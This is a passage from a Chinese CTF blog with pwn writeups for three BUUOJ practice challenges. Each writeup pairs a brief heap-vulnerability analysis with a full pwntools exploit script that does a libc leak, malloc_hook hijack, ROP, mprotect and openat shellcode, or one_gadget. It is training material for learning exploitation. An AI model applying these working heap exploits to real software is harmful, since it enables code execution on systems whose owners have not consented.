<p>由此可以得出，因为程序是主动调用sigreturn的，并不需要<code>rt_sigreturn</code>指向一段代码，再调用sigreturn系统调用。</p>
<h2 id="ciscn-2019-final-4"><a href="#ciscn-2019-final-4" class="headerlink" title="ciscn_2019_final_4"></a><code>ciscn_2019_final_4</code></h2><p>这个题还是很好的题目，考察了很多的基础知识点。</p>
<h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><ul>
<li>开启了沙盒禁用execve</li>
<li>开头让你输入name，有一段可控的栈空间，且较大</li>
<li>pie保护没有开</li>
<li>存在反调试，使用ptrace做的，直接gdb attach过去会进入子程序，看不到堆情况(直接在fork 汇编处，改汇编，<code>jmp 到程序输出字符串的地方即可</code> )</li>
<li>watch函数中也用ptrace，监视了<code>open，mmap，fork，vfork，ptrace</code> </li>
</ul>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )
  &#123;
    ptrace(PTRACE_SYSCALL, a1, <span class="hljs-number">0L</span>L, <span class="hljs-number">0L</span>L);
    waitpid(a1, &amp;stat_loc, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> ( !(stat_loc &amp; <span class="hljs-number">0x7F</span>) || (<span class="hljs-keyword">char</span>)((<span class="hljs-keyword">char</span>)((stat_loc &amp; <span class="hljs-number">0x7F</span>) + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>) &gt; <span class="hljs-number">0</span> || (stat_loc &amp; <span class="hljs-number">0xFF00</span>) &gt;&gt; <span class="hljs-number">8</span> != <span class="hljs-number">5</span> )
      <span class="hljs-keyword">break</span>;
    ptrace(PTRACE_GETREGS, a1, <span class="hljs-number">0L</span>L, &amp;v3);
    v2 = v4;
    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">2</span> || v2 == <span class="hljs-number">9</span> || v2 == <span class="hljs-number">0x39</span> || v2 == <span class="hljs-number">0x3A</span> || v2 == <span class="hljs-number">0x65</span> )
    &#123;
      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"hey! what are you doing?"</span>);
      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
    &#125;
  &#125;</code></pre></div>

<p>这里可以监视一下execve，好像就可以不用开沙箱了。</p>
<h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>存在uaf</p>
<h3 id="难点-1"><a href="#难点-1" class="headerlink" title="难点"></a>难点</h3><h4 id="orw的rop-chain往哪里读"><a href="#orw的rop-chain往哪里读" class="headerlink" title="orw的rop chain往哪里读"></a>orw的rop chain往哪里读</h4><p>程序自身是存在较少的gadgets的，想直接完成orw 的rop chain，是不可能的。<br>上来因为没开pie，能简单的完成一个read功能。在泄漏libc以后，就有更大的发挥空间了。</p>
<p>开头name有一大块可控地址，该怎么使用上。先输入一段垃圾数据，留着寻找。</p>
<div class="hljs"><pre><code class="hljs python">sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'chumen77'</span>*<span class="hljs-number">10</span>)</code></pre></div>

<p>在控制malloc hook后，随意写个地址，让其crash在这里，查看下栈地址：</p>
<div class="hljs"><pre><code class="hljs python">data = <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(<span class="hljs-number">0xdeadbeef</span>)
add(<span class="hljs-number">0x68</span>,data)</code></pre></div>

<p><img src="http://qiqianyun.chumen77.xyz/uPic/JsY1bN.png" srcset="/img/loading.gif" alt><br>发现断在0xdeadbeef，栈上可以看到输入的name情况。</p>
<p>此处来一个栈劫持，增加rsp 指针0x38 ，接着ret上去，就可以执行name上的东西，这个东西肯定写成仅能完成的read rop chain。</p>
<p>因为pie没开，可以使用这个新的read 在bss段上读取一个新的rop chain，接着ret 上去执行。新的rop chain，可以为mprotect解开bss段的执行权限，接着跳上orw flag的shellcode即可。（<strong>mprotect 需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。 这里直接设置为bss起始地址即可。</strong>）</p>
<h4 id="open被禁用了怎么办"><a href="#open被禁用了怎么办" class="headerlink" title="open被禁用了怎么办"></a>open被禁用了怎么办</h4><p>可以使用openat进行代替。</p>
<div class="hljs"><pre><code class="hljs c">
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
 
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">int</span> oflag, <span class="hljs-keyword">mode_t</span> mode)</span></span>;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">openat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">int</span> oflag,  <span class="hljs-keyword">mode_t</span> mode )</span></span>;
        <span class="hljs-comment">//函数执行成功返回文件描述符，失败返回-1.</span></code></pre></div>

<p><a href="https://blog.csdn.net/liangzc1124/article/details/83475246" target="_blank" rel="noopener">https://blog.csdn.net/liangzc1124/article/details/83475246</a></p>
<p><a href="https://www.cnblogs.com/BinBinStory/p/7400993.html" target="_blank" rel="noopener">https://www.cnblogs.com/BinBinStory/p/7400993.html</a></p>
<p>其中重点就是，当openat的path参数，输入是绝对地址时，fd就会被无视，其函数就相当于open了。所以此处的fd，也是可以设成任意值。</p>
<h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># encoding: utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./ciscn_final_4'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25080</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>
    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'size'</span>,str(size))    
    sa(<span class="hljs-string">'tent'</span>,str(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'index'</span>,str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'index'</span>,str(idx))
bss = <span class="hljs-number">0x6021C0</span>
pop_rdi = <span class="hljs-number">0x0000000000401193</span>
pop_rsi_r15 = <span class="hljs-number">0x0000000000401191</span>
pop_rsp_r13_r14_r15 = <span class="hljs-number">0x000000000040118d</span>
orw = flat([pop_rdi,<span class="hljs-number">0</span>,pop_rsi_r15,bss + <span class="hljs-number">0x400</span>,<span class="hljs-number">0</span>,elf.plt[<span class="hljs-string">'read'</span>],pop_rsp_r13_r14_r15,bss + <span class="hljs-number">0x400</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>])
sa(<span class="hljs-string">'name'</span>,str(orw))
<span class="hljs-comment"># sa('name','chumen77'*10)</span>
add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">'1'</span>)
add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'2'</span>)
free(<span class="hljs-number">0</span>)
show(<span class="hljs-number">0</span>)
r()
libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>
info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)
add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'3'</span>)
add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'4'</span>)
add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'5'</span>)
free(<span class="hljs-number">2</span>)
free(<span class="hljs-number">3</span>)
free(<span class="hljs-number">2</span>)
malloc_hook = <span class="hljs-number">0x3c4afd</span> + libcbase
add(<span class="hljs-number">0x68</span>,p64(malloc_hook))
add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'7'</span>)
add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'8'</span>)
rsp_add_0x38 = libc.search(asm(<span class="hljs-string">"add rsp , 0x38\nret"</span>)).next()
data = <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(rsp_add_0x38 + libcbase)
<span class="hljs-comment"># data = 3 * '\x00' + p64(0xdeadbeef)</span>
add(<span class="hljs-number">0x68</span>,data)
<span class="hljs-comment"># debug()</span>
sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)
sla(<span class="hljs-string">'size'</span>,<span class="hljs-string">'20'</span>)
sleep(<span class="hljs-number">0.2</span>)
pop_rdx = libcbase + libc.search(asm(<span class="hljs-string">"pop rdx\nret"</span>)).next()
pop_rsp = libcbase + libc.search(asm(<span class="hljs-string">"pop rsp\nret"</span>)).next()
mprotect = libcbase + libc.sym[<span class="hljs-string">'mprotect'</span>]
payload = flat([pop_rdi,<span class="hljs-number">0x00602000</span>,pop_rsi_r15,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0</span>,pop_rdx,<span class="hljs-number">7</span>,mprotect,<span class="hljs-number">0x602628</span>])
shellcode = shellcraft.linux.openat(<span class="hljs-number">0</span>,<span class="hljs-string">'/flag'</span>,<span class="hljs-number">0</span>) + shellcraft.linux.read(<span class="hljs-number">3</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x30</span>) + shellcraft.linux.write(<span class="hljs-number">1</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x30</span>)
sleep(<span class="hljs-number">0.2</span>)
s(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + payload + p64(<span class="hljs-number">0</span>) + asm(shellcode))
<span class="hljs-comment"># debug()</span>
itr()</code></pre></div>

<h3 id="延伸做法"><a href="#延伸做法" class="headerlink" title="延伸做法"></a>延伸做法</h3><p><a href="https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/" target="_blank" rel="noopener">https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/</a></p>
<p>其是用<code>house_of_orange+setcontext+0x35</code>调用read传入ropchain来完成攻击。</p>
<p>如果无法控制<code>free_hook</code>且在libc-2.23情况下可以利用这个办法。</p>
<h2 id="sctf-2019-one-heap"><a href="#sctf-2019-one-heap" class="headerlink" title="sctf_2019_one_heap"></a><code>sctf_2019_one_heap</code></h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><ul>
<li>不可指定idx，来操作chunk，只能操作当前malloc 分配chunk对应的heap地址</li>
<li>只有free 和 add，free可以4次，add可以<code>0xf</code>次</li>
</ul>
<h3 id="难点-2"><a href="#难点-2" class="headerlink" title="难点"></a>难点</h3><ul>
<li>无show函数</li>
<li>有限的free次数，只能通过合适的堆技巧或者爆破来完成攻击</li>
</ul>
<p>此题由于只能4次free，其中3次free还是直接必须执行的，只剩下的一次就尤为关键。目标就是在其free以后，有办法让再次申请的chunk可以修改到这个free chunk对应tcache bin的fd，来进行tcache attack。</p>
<p>当一个堆A同时在tcache里面，又在unsortbin里面，这种情况是常见的，并且也是危险的。</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/T5GJ9H.png" srcset="/img/loading.gif" alt></p>
<p>当先申请一个小的chunk C，其肯定是在此chunk上按照unsortbin的规则，分割一下，留下一个小的unsortbin bin。<br><img src="http://qiqianyun.chumen77.xyz/uPic/yB8mNI.png" srcset="/img/loading.gif" alt></p>
<p>然后接着申请一个相同于chunk A大小的堆，就有机会改到这个2个被分割完的小chunk。<strong>比如改0x61的unsortbin的信息，可以改其size，并且提前在chunk B处伪造好数据，即可完成一个fake 的 unsortbin。</strong></p>
<p> <img src="http://qiqianyun.chumen77.xyz/uPic/pCToHT.png" srcset="/img/loading.gif" alt></p>
<p>倘若再申请一个合适的大小，比如0x68，即可改到chunk B的数据。此题也就是改其fd指针，即可接着完成tcache attack。</p>
<h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># encoding: utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./sctf_2019_one_heap'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
roc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae16 = <span class="hljs-number">0x3c4b78</span>
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'size'</span>,str(size))
    sa(<span class="hljs-string">'tent'</span>,str(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>
    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>
    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'chumen77'</span> + <span class="hljs-string">'\n'</span>)
    free()
    free()
    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)
    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)
    <span class="hljs-comment">#夹在top chunk前面，防止进入unsortbin时直接合并。并且fake一些数据，留着绕过后面的检查。</span>
    add(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0x20</span>))
    free()
    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)
    free()
    add(<span class="hljs-number">0x28</span>,p16(<span class="hljs-number">0x9750</span>) + <span class="hljs-string">'\n'</span>)
    debug()
    <span class="hljs-comment"># 修改剩下0x60大小的unsortbin的大小为0x90，且前面已经有fake的数据，不会让程序crush</span>
    add(<span class="hljs-number">0x7f</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x91</span>) +<span class="hljs-string">'\n'</span>)
    payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">'\x00'</span>
    add(<span class="hljs-number">0x7f</span>,payload + <span class="hljs-string">'\n'</span>)


leak = <span class="hljs-number">0</span>
<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    <span class="hljs-keyword">try</span>:
        leak_addr()
        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)
        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)
        io.recv(<span class="hljs-number">16</span>)
        leak = u64(io.recv(<span class="hljs-number">8</span>))
        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x320a6464412e310a</span>:
            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)
        <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">except</span> Exception:
        io.close()
        io = process(<span class="hljs-string">'./sctf_2019_one_heap'</span>)
        <span class="hljs-comment"># io = remote('node3.buuoj.cn',28690)</span>
        <span class="hljs-keyword">continue</span>

leak = leak &gt;&gt; <span class="hljs-number">16</span>
info_addr(<span class="hljs-string">'leak'</span>,leak)
libc_base = leak - <span class="hljs-number">4110208</span>
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
malloc_hook = <span class="hljs-number">0x3ebc30</span> + libc_base
payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">11</span> + p64(<span class="hljs-number">0x41</span>) + p64(malloc_hook<span class="hljs-number">-8</span>)
debug()
<span class="hljs-comment"># 修改0x40 tcache bin的chain</span>
add(<span class="hljs-number">0x68</span>,payload)
debug()
add(<span class="hljs-number">0x38</span>,<span class="hljs-string">'\n'</span>)
realloc=libc_base+libc.symbols[<span class="hljs-string">'realloc'</span>] + roc[<span class="hljs-number">1</span>]
one = <span class="hljs-number">0x10a38c</span> + libc_base
payload = p64(one) + p64(realloc)
add(<span class="hljs-number">0x38</span>,payload + <span class="hljs-string">'\n'</span>)
add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'\n'</span>)
<span class="hljs-comment"># debug()</span>
itr()</code></pre></div>

<h2 id="ciscn-2019-es-4"><a href="#ciscn-2019-es-4" class="headerlink" title="ciscn_2019_es_4"></a><code>ciscn_2019_es_4</code></h2><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>利用off by null，构造chunk overlapping，然后tcache attack即可。</p>
<h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># encoding: utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./ciscn_2019_es_4'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26094</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>
    sl(<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
    sla(<span class="hljs-string">'size'</span>,str(size))
    sa(<span class="hljs-string">'tent'</span>,str(data))
    sleep(<span class="hljs-number">0.1</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sl(<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
    sleep(<span class="hljs-number">0.1</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
    sl(<span class="hljs-string">'4'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
    sleep(<span class="hljs-number">0.1</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>
    sl(<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
    sa(<span class="hljs-string">'tent'</span>,str(data))
    sleep(<span class="hljs-number">0.1</span>)

add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">'\n'</span>)
add(<span class="hljs-number">1</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>) 
add(<span class="hljs-number">2</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-string">'\n'</span>)
add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">'\n'</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>): 
    add(i+<span class="hljs-number">4</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">'\n'</span>) 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>): 
    free(i+<span class="hljs-number">4</span>) 
    add(i+<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">'\n'</span>) 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>): 
    free(i+<span class="hljs-number">4</span>)
free(<span class="hljs-number">0</span>)
edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xa0</span>+p64(<span class="hljs-number">0x1e0</span>))
free(<span class="hljs-number">3</span>)
free(<span class="hljs-number">1</span>)
add(<span class="hljs-number">3</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0x90</span>)+p64(<span class="hljs-number">0xa0</span>)+p64(<span class="hljs-number">0x00000000006022B0</span>))
add(<span class="hljs-number">4</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>)
add(<span class="hljs-number">5</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>)*<span class="hljs-number">2</span>)
add(<span class="hljs-number">6</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>)
show(<span class="hljs-number">6</span>)
r()
libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebc0a</span>
info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)
free(<span class="hljs-number">6</span>)
free(<span class="hljs-number">2</span>)
add(<span class="hljs-number">7</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">15</span>+p64(<span class="hljs-number">0xb1</span>)+p64(<span class="hljs-number">0x3ed8e8</span>+libcbase))
add(<span class="hljs-number">8</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-string">'\n'</span>)
add(<span class="hljs-number">9</span>,<span class="hljs-number">0xa0</span>,p64(libcbase+rce18[<span class="hljs-number">1</span>]))
free(<span class="hljs-number">8</span>)
itr()</code></pre></div>


            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/10/06/mac 上ida 7.0 闪退 打不开 解决办法/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">mac 上ida 7.0 闪退 打不开 解决办法</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/09/24/ciscn 2020 华中分区赛部分wp/">
                        <span class="hidden-mobile">ciscn 2020 华中分区赛部分wp</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
